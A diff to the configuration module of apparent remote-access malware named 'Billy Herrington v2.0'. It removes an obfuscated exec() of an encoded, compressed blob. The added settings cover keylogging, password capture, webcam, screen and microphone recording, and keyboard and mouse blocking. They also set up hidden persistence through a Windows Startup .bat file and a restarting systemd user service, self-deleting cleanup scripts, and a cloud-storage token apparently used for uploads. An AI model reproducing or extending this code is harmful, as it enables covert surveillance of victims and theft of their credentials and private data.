@@ -6,8 +6,76 @@ import constants
 import network_token as network_token
 
 
-def _(__): return __import__('zlib').decompress(
-    __import__('base64').b64decode(__[::-1]))
+version = 'Billy Herrington v2.0'
+username = getpass.getuser()
+os_name = platform.system()
+os_version = platform.release()
 
+yadisk_token = network_token.token
+root_path = Parser.get_root_path()
+downloads_path = root_path + 'downloads/'
+uploads_path = root_path + 'uploads/'
+logs_path = root_path + 'logs/'
+log_path = logs_path + 'log.json'
+configuration_path = root_path + 'configuration'
+keylogger_path = root_path + 'keylogger.log'
 
-exec((_)(b'==wn0IyP/f/+5/fLLNo6Fe+98LrD4gw7VnNqwqbNll7IanrkfvOpCAdCGRqFdnwxXAdF5X3mdABAAoAQCATASHx7e7FsQ8EHbsymknDG2SdT1e7zw2kdiIskg2h0rxWh7WnsJmeirTpD9rMCfdB5tJWntTLdfKfWDHvYcvr5F8ndMjxyNKInub3/5ieJ4JEyJonG8WB/ziV28QM3V8g1ttWwZAv4e9tYYA+/CeBUa7jjM1JTAEsOKhllbhduzKQ5u3EISDiovc/C/pwQeKyHhAaObF5RFe4F0O0IVK7w1ynZkGif6B+3W119YBZ6K08GtgBcD6InBVkBFoPfI2PkEDoCG9TUL2jSM+dlo/xpKXIr19JgxySFB2HrBuI/SnVvWwJ5NVMPuG/d+lroI5lm113n12oh5p5kaWKcUxp9LZBbJv9D6Q7VYFXUKJ7+xiZlKYCEhfZnDuuI37X8mFSpTHfYB+3t5SO+Ul7r2wd/KYVU+BsoeW5L3GU65Th4pM+eImT0Ed8AQTMTw7QtW1vRt8R5B6ntX7KzbqrCTGE+gWUOeUy2G3TAIT0beXuTcTn1STBpeDPgqhew8ZaqOc0JrUaisyYNzD4vCurCdXOnwx2r/AjcKdPo2PIdb+XmI2PfExByinPih3QRYjydzcRmIMoDqrXqepXupd5dkVfnYkOOlb/qdj5InFFK8Bke369FlS8KVviYWIyNkThUygBymleannPzmPZRqZZRmuN/JocsQzEQWWrvakPYhblRLTE6Nu9U1fMwDgjcVerEz2nmAl8dLISgtO9WrZ0vDheWAPcNWGUSVdRaza6AI1LFozZSveVxAtnf4zLSdYrAE/hhsdNFX2ThK+K7+PlqxQh0VTabw2rkARAS6yXH+Tx8ntz7iFMzDBOCgtgM30ESv98zg3kA/Qb1qtuXhzZPc6H8lysetIBpch5I2cFnqTs+ehEdqqlBxQrmRxMocvlV3UfLkj7g6dmbisvM9w0Ez/m5D/cVdlKyAyAB2Ua06jZelLhWdgj8xhfhTkTQpHWGfua5Sr9deHBDQFOlLnNmHLuMX/DFHPdtitJe5RbgjfK23+0bR4JEsOFOJE17bsqMi/FNOgMuKRC4c6GaR1M9t2vqjIQSPab+ROrEUjjXmnSzLomfowEl9ZiuwxfYWEmxdJkK5ztWyX2KColldVYdhoF6R1GH1rRDCMihkQozMdZh14raaqfc55zZ7Gfsc4266TBhq3Ndjah5GxRN/B8Fvvf6x3y+s6stDEp02HeFSJxf1ALCTLGZxHnKNQMkrihjS2V8Y9HXkv54K/B75YJewD/UJuHEN3JCj4Sulash+pf3tHwRb53W+6qgeEDSmo53qCoVQZNXUMhRNtxivssuKazLtm+OAGnLTKRmmFd3bNldOKIWZJg9Hm85Sj01Db9l09ihqtgyfelvuPghqURGb9WtEUudJKG4HKfVxnR00IgcSPvbQMS1lMUdoRpTXNroABP8cQ/w7hoMIwhwT3Fyh83jUyYq4qYtG5iT9frrG+xWkgmKFLuO4zRoItN9vMQzuTmnTeiGmzoV0NTKmyxWydsmABFLNpf+kxJMQtGx8uOp6pt0VdX+z81Ybh7xOJWjeosHJOmJDeSVEVu9nZJNN4LzLaBq5HXczDzR5j5wuoljxak8VrYPTd3ZBxFOGe5kRm7RP+rUQyWJR34HU8i11orO8WZSVaZRmq9h7sd+r7VMDarB0yWDVyp6Gny1i3ul8948vNDE8aPYB3yFEXfwgg6xmB9Q7pHiocr6Slbqm6zGw2n+uLZTbDQd5mL7P6r2UCSfcIEHrY+DlO8IZsiW/hp0O5LpCd0vSg2CGzFAUIGIsDTjAqzQBSgbsoecorkrFybH+S+1npnmUerahm3ZEKMSg1yMJzFQfbTLsKyXg1qWI6D9sfXgW1z+fyLtWadMiL645BoFufJnnLPSpS5uVDI2DdvwrUODtW7pEu+1ctI1wDFoVWxHXKfFU4ENVz+kx/BuYJMafy71YMmiygcqfOncm/lz0DJ5+TSDSTwpSXU7/GeQ2JNKPdRAYGTdjNdbgWfLUxCfqAs1DsFVLB1qq4UFqREgk43bH/Ov6+8qdcpIF42F7bJCvh+IlZtTj0jtVxADBE/nk2YkRU1Ipqgh1JLGcUh6XUB8ZnmdCL4Xks5ck/VTcuLyspbrAEjbl1My1o+kPlcvj9Z87/eMN5WTMM5+v/k50FLYP7RnUMIxbqAPN6oWlhVGb1fL/ihSGqxEsnJWKbywXfQvQ61A9aYFeeOKVygjxp4gEfeN4UPi64Lj8YouYFDGZgpMRK9V0IA9RmmW0FSL5A5RH5aQndCIEDf9i1CMk4W0nAMszS1JyZMTQOCsIOGoW5K7f7KR8o36gAFSgZWWqtUdVgKkwxfp2UJdU/ymycGPdevYFNqVKa9MTEP2HtpioEFjGCoBVCoBJxeoN43ZWsR5Dp3NcZ//Eub0UEGtxJrB6fCD/9BU+ESb1AeE83MA68XpITAcC22YglluNJipALtZM5yzJR5cVw9B5FJPyL2mPbFKZMPhOVN++uUxoAZQu5ka+MMznKRxE4Da593rIYZ9RYh1WEEIdp2aJymty0Kb3RUuJBESx0wF6voLkXPwoilayTWsqSmUpLTMGesrc16k2rq8t3PhZ6kOk06tDMSv9V2gN3icyrY17SHM0vse5OyisYzxfv3vJJCA51vr+NoLypFd67AvvdVOfTYIBj1avxSfCsHbgGSISFCmLQtORdqPt4uTDa61KuXk8bnhsSeGUkkaHQhpOcJ0TrO4l/HPRQf2LSkEXy0VLbbmdcKu+guJlStyXwsngREQL5M2H2bS1U1G5h94ntwvekl7qqXhksnH43WpLR6LSjTA5XBXf4zFcHAAR3n0N7awnYLAXizIfTnMUiY25eHxe0guGRFBu+FTCW6+8UJ4IjeE0Ocrr6SKzyn59DuuEIjt+xIsxyl086Xq+tCl68dUTtCc/ojAkR14SzKlIVRo/VYxCe+lI1KSCCl05T8TQ/D2J81K+tOtvBSnTMWyxjbLZ27JVane6D1yu/cFpTjg+NPxngI0wfX7hjfX6GatscGnqvPodDzTwXmvlH1jQIYHa5PBvl9zw9oYiSj5To5tbgnodTqGpsoyUYgPT5tNhmIatAOAMhi0ca+kftcnj1lpPrcawNDr+bGSpOPvjHQGmovDfb1y4H280XZ4FDjSvvRyF7FfvXWdQKTdarWxE+PhMfTWEGtITuHmhQFullM/EIcxUgq8bS2nApdnheoy5XfbHXXzsIVMyS10Y10xC1Z6c3+cPv8BaDn62TNDhpsfLYZh9ALLGZrwvCKPoAPxJDvjS128WULros3NqAsRe21K2pc9MKjtg3d+O0WZihZrDhjBulsQZu4hQ0S1ulzzEqWGYUXGzxiwMaXPVuJbPho4IUc8YYwpzTmHJ769sFlOd+sopPmxe87DFqhIPhYGsueHAKVh5D/zoUzIZQuPv2Ahr9rfJTydNnxuF5XTG7BFWJ25azqBu636+2yN/SQSMbeaVTHJgSyP5JB8CYnYHePs+SNLdM2w1CLztDYZc8qEvwMA0Sp5LXehsOq8emdrpgy1eq3cpbWEllpt50vrx0YpCwvIB+Xzce6OZ45ILrb7DBAvxRhWFn2uHGim1nn0axFSuds0xSSQOW2z31ImKDqqDwEUxMuxR0IPnvTjGhlVg+8t1hmP/C90qBWmIAQYmCxavDexZa4TYO/V3HdC4r6vjmzDH4U98h6PHuEDXgBgLroXwPv6IDCpCtx31e7Ta1cvUwP1sB2cptDUPF72RRYUg8Fgn0/LMQPKVONeaerwAk17pORO1Yhrt4SK9lm+FOAlDvJ/4j082YKy2aSfkpnueu45emeafHBGLxIZx+QzZS+mhQRWPLU+wP1YkHZizLHT7HMlGy47yC0gkDYwjOJiT9ia4CE0Q6Zv3eHYFB1DTXVmxvf6uq0ImEXFNWNheer+LsRM6DGeHetaJAcXKrK2Hd2xDKbERnBHY8sVGrKziEVZstiFadO9nQ9lraUGv2HvdC/BPnxYAXpK2iuXblXts+xYa28gAJjPUJ36bLu5CtimIYhZL/HUAgUPq28jTjjr3HLjkePgkC53ByFiq3w0uftpwSDY0hVI+ZarNQCwd1CbHqHn/cNxh2Qu2RqSGV3h41RI71R2uRYtVhjtG5VJHje5PvdWkKz0eyKTfXfaL1FkDA/enI8VTfkF4OBOhwnt0i04b488dMqKKRqtIKmf+5k3RNRqgr1BxuaNb9oPyFsvFsnl/BHgOpKiVZZHTOow6HlAoHEfJz20wu/7sYICjAyNc/GJHh4byBocpQx3u/OSnd8w60ZIRF+qCKCYNEG8vU2dIXm4B7KDHTJdvwJGBPcu6Go/p4mqMYjv6wVPEC9N6/cjWp/7r06IYvG9r8J0l1uf5PPShM9z2wvSk2pNzGGTSIVhoEG2V7l7Bmr1sUq8Dyjf5XrQD/h5SUWme/L7qMjy+7HqMlrHWuiNkiWVebhw9A/wS/LVn54tASoaEnLZ73u9usBatUMffxXh4XKI8Tzy+sRs+mOsAJnEuxHVIjf+Wr2YmbXYiqcgX0bmc1+NY21HHmuHu+1V79xqbTja1b061grMcMPQn/eP3xD36bv89BzVX4xYmP7UYs/Ahjsp0tBvGUg0BsEp7TmWhSN07H/SsnW1mW0LYKJnOGe11ZIKmMN+Qq6hsZdt+5d+6uxHdFowI/TJqX8rFl+Kp6HGA593uSmuC4k/6WWqMqGygqDKqYw3H9djRzExV6gYIkR1aeam5UT50aRhVXpmSaMUJEhabP3h+cR5vcKb6SV5K2kl2D7HVL+Nrn6yVXG5n3tkVuRfNb9vQ+Bjcn5i+SaZxzMHr46HTqgF6fCyMyEZQEbYGovuEGQnsalOtPtdomV8W/WwItc4BMewKiulni4+EWDq+r8STPI9FcipJ+WQhHRhbubh4ZlRPY9y34/brhehqUoBrR62x6/tCJlIQvJCn9Rz8x5lfFww7j+pNKEa2RLR+g5sNDforFsBr5tbfD20mC6ZHcroGT47oizrjh+6OdZCz2w4raxbkLe9Iw22v16fvYwb+kUYTDezSrKT3DRlcucVAvSTmgkd7CCJv1LFTL0e0G593Wcjlnsa8p19Mtou/u455dGA/Pk4yTfd/YsKZNG6my7h5EvBPjhXV0D+I6UogU+BOXzB64TKSxksbgVOCcWk0A0CmVpuo8eNzmz6P9dDQxYXxTXCp5bfW/qb2alYq8sKt2rXh/YZcQ5h9iq+rac0yMihrHNI2dknBhSw3Wori/4yQy4wcmgnNb0CfurYBRdPLrSH5WMGXNocIXYrV0MGVjh0D/kLByhD476bJL8HToG2YmRfaP8Mj3Cq+zHtHGOg8f+Jsvq48GVGucElZXtCDWMiuqZc/9q6+49oMbimrEaTK6D1gdkrVp8rEn1+MUAE0msWpoT0whHhJOFqlVEw7CMHvMTVuUoXARr+60l12dObnP01TuG6edjmvVbV79BCCUhTspgYAfJgsHFTS12umq4IfsbxhIxqOf6oWuAsGOXkGfRmDwG9SLbNnt0Jaab6lU26QnVilODpjyxa6cf2MB4upcbQwMezXLNq0MOmk1riduNt0QD8rhBejIhvhWmZMOTTRUuQAk4q1c4WjFd3XtFHUZl/WjqAa1DI40XTJmFXTX5ba6gksuMHivSLI1CwUOt/rTkdwDkVCwlCcjkqDgYP/Gzly1yiXLUNfd1M8k8ITz2Z8ss1+M6t2CVB9PsgNoUM24gMRKXyLnH9OJ74NsbHxw8OAqMtUIxRgRC+QxzbVBk7eGU2neK0M95Mx99OU+2t50Csex7j1k0nsFCiHA3DJCMfcM/6Rj5U5Qafojv71yK5vGGbx5jqp6FEz0x/QA1fWhyIW3PN+eIqqYNo1iz3+RZ7adkj4LHROr7wlL4GiXszN0VZ8qyybhTHkmSqepLHIH8aP3ZazlHwN4Ilk1ZQd7cpA+IhQFbWDq5s70AHyyHE1nGwDQkgz1Ocbr8ZkrUViYbPaLNhHDRgaW/JItXm9mhYvJF+tIJurnBADFq41DXSbhr8Cy5355a1tQxMpy8xGMK0w4PDopUCuq+Fsuhj4VVLF7GifNr3ycfPmorpZVqUtawzo41eBg5HPEvrPQ0cKNhWclO2Vkzii8+uPgSZ/TFV9zyAlAefpnXdqyvNO9mD7wPR64RGO+tVkRuCllcJneyzNhInkhsxF5Q7yeEyKpRRKxAEuBIU5IHYSp6t8q/j56BI9BjA8ARyoY6AXGoxBB1vS0E8E0H4dE19ZK6k+JXWG+yq0Dl3Yog4rfsP8W16vOJWzBofmagxH8gQ4NylQv+KT1lDFkpCiWbPxqe4dYT+mhhVIDfWAEiwcbhAfWZsjy+8niiHz66kFT6zavDzRnZ/qeXDU133jAGK7AdUteoYoG0xwdH/IDb1jjUXSdCndtGk4F7gs5aTRMj2TQNal4/id/OxoIEmN/cJTlTZGK9chwIcSYfsUtPljY5IilVzd50D5j5SbAp/W+jC9A9LBQ/5ANhXn4URYUP/F/khpTs3yBvlE6CEUTaeRTo0Q5tFjkcbGwS3rHpBIcZnFHf+wzFiW7Hy8eiHI5bjPsl7RXSbWlkltlAjZU9a6IQ5D+EE1Lx0eNkJ54jzrIGpk1HD6At239GMx3/md7uL+LfwobASZ+1NFdrGK6eXlVDQgtj6Sjlq4bT7oab299Um2kijbzDA+izKeDuBquF2rrEc1bsQDWcyMVEdGgpnyGt3wvspbt0uDDSf4eaZlEJdls6SawYahQxxrPnvI44+8Ku0WkoxnLSAwL1CG4UadEWxkbcjDz2tuEVQh3dOItgiN8ttwAVkNILde1koWz+iL3KZM5+SivkfhRtbUsq4peQypXpCGpdqyYVZdHXOhlWB7QnuoK0uhLjp3kexCtO055VMEmBuf7WXnMIIbZAes8Y4XW9eTK3I+l71P185RXEi1lZXr0UfpxWky3VYLUt+ATj+61QD7QDY63yaZr6eRP0Jyk6j6yK4VSL/jH442iw1F/zGTiW/o5ZbmQOOIsEBnnqBvRwSgJYCnLY15uRPvtP//T2//935z/vMvjSdtfH2xBgT79S967+JBmnNi7E4eMobBI4qn+TRWgNpSUMmVwJe'))
+if os_name == constants.Windows_OS:
+    Billy_path = root_path + 'Billy/Billy.exe'
+    main_dir_path = f'C:/Users/{username}/AppData/Local/Comms/Unistore/data/5/a/billy/'
+    main_file_name = 'Billy.exe'
+    main_file_path = main_dir_path + main_file_name
+    tmp_dir_path = main_dir_path + 'tmp/'
+    old_dir_name = f'C:/Users/{username}/AppData/Local/Comms/Unistore/data/5/a/old_billy'
+    startup_dir_path = f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/'
+    startup_file_path = startup_dir_path + 'Billy.bat'
+    startup_file_value = f'@echo off\nstart "" "{main_file_path}"'
+    delete_bat_path = startup_dir_path + "love.bat"
+    fixed_path = delete_bat_path.replace("/", "\\")
+    delete_bat_file_value = f'@echo OFF\nRD /S /Q "{main_dir_path}"\ndel "{fixed_path}"'
+    appdata_path = f"C:/Users/{username}/AppData/"
+
+if os_name == constants.Linux_OS:
+    Billy_path = root_path + 'Billy/Billy'
+    is_root = os.getuid() == 0
+    home_path = f'/home/{username}/'
+    config_path = home_path + '.config/'
+    main_dir_path = config_path + 'Billy/'
+    main_file_name = 'Billy'
+    main_file_path = main_dir_path + main_file_name
+    tmp_dir_path = main_dir_path + 'tmp/'
+    old_dir_name = config_path + 'old_billy/'
+    startup_dir_path = config_path + 'systemd/user/'
+    startup_file_name = 'Billy.service'
+    startup_file_path = startup_dir_path + startup_file_name
+    startup_file_value = f'[Unit]\nDescription=Billy Service\n\n[Service]\nType=simple\nExecStart={main_file_path}\nWorkingDirectory={main_dir_path}\nRestart=always\nRestartSec=5\nKillMode=process\n\n[Install]\nWantedBy=default.target'
+    startup_delete_name = "love.service"
+    startup_delete_path = startup_dir_path + startup_delete_name
+    startup_delete_value = f"[Unit]\nDescription=Remove Billy Service\nAfter=network.target\n\n[Service]\nType=oneshot\nExecStart=/bin/rm -rf \"{main_dir_path}\"\n\n[Install]\nWantedBy=default.target"
+    default_target_wants_path = startup_dir_path + \
+        'default.target.wants/' + startup_file_name
+
+tmp_photo_path = tmp_dir_path + "photo.png"
+tmp_screen_path = tmp_dir_path + "shot.png"
+tmp_video_path = tmp_dir_path + "video.mp4"
+tmp_audio_path = tmp_dir_path + "audio.mp3"
+tmp_passwords_path = tmp_dir_path + "passwords.txt"
+tmp_log_path = tmp_dir_path + 'log.json'
+tmp_configuration_path = tmp_dir_path + 'users.configuration'
+tmp_keylogger_path = tmp_dir_path + 'keylogger.log'
+
+default_callback_timeout = 300
+
+max_time_to_keyboard_block = 60
+max_time_to_keyboard_spam = 60
+max_time_to_camera_record = 60
+max_time_to_mouse_block = 60
+max_time_to_mouse_spam = 60
+max_time_to_record_microphone = 60
+configuration_timeout = 10
+log_timeout = 10
+keylogger_timeout = 10
+
+max_file_upload_size = 52428800
+
+special_separator = "&"
